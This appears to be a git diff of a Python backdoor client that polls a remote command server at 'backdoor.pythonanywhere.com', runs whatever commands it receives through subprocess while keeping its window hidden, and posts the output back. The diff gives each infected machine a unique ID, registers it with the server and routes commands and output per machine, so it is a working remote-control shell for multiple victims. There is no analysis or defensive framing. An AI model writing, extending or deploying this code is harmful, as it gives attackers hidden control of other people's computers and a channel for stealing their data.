@@ -5,9 +5,12 @@ import os
 import json
 import subprocess
 import base64
+import uuid
 
 
+# SERVER_IP = 'http://127.0.0.1:5000'
 SERVER_IP = 'https://backdoor.pythonanywhere.com'
+ID = str(uuid.uuid4())
 cwd = os.getcwd()
 
 root = tk.Tk()
@@ -15,21 +18,24 @@ root.withdraw()
 root.attributes('-topmost', True)
 
 def send(output):
-    requests.post(SERVER_IP + '/server/send', json=output)
+    requests.post(SERVER_IP + '/server/send/' + ID, json=output)
 
 
 def main():
     global cwd
+
+    requests.post(SERVER_IP + '/register', json={'id': ID})
+
     while True:
         try:
-            post = requests.post(SERVER_IP + '/server/recv', timeout=10)
+            post = requests.post(SERVER_IP + '/server/recv/' + ID, timeout=10)
             while post.status_code == 204:
-                post = requests.post(SERVER_IP + '/server/recv', timeout=10)
+                post = requests.post(SERVER_IP + '/server/recv/' + ID, timeout=10)
             payload: dict[str, str] = json.loads(post.text) 
             cmd = payload.get('command')
 
             if cmd == 'exit':
-                requests.post(SERVER_IP + '/bye', timeout=10)
+                requests.post(SERVER_IP + '/bye/' + ID, timeout=10)
                 send({'output': 'client shell deactivated', 'error': '', 'cwd': cwd})
                 continue
             
@@ -80,6 +86,7 @@ def main():
         output = result.stdout.decode()
         error = result.stderr.decode()
         output = output if output else None
+        error = error if error else None
 
         send({'error': error, 'output': output, 'cwd': cwd})
 
